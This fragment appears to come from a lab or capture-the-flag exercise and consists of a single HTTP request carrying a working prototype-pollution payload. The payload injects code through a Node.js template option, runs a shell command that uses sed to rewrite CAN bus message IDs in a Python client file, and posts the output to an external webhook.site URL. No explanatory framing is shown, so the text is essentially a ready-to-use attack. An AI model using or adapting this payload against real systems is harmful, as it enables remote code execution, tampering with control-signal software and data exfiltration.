...
GET /ctrlsignals?message={"action":"update","key":"__proto__","subkey":"outputFunctionName","value":"x;process.mainModule.require('child_process').execSync('sed -i \"s/0x656/0x201/g; s/0x657/0x202/g; s/0x658/0x203/g; s/0x659/0x204/g\" /app/canbus_client.py 2>&1 | curl -X POST --data-binary @- https://webhook.site/debde32f-99e3-4c64-b786-865a6b862801');x"}
```
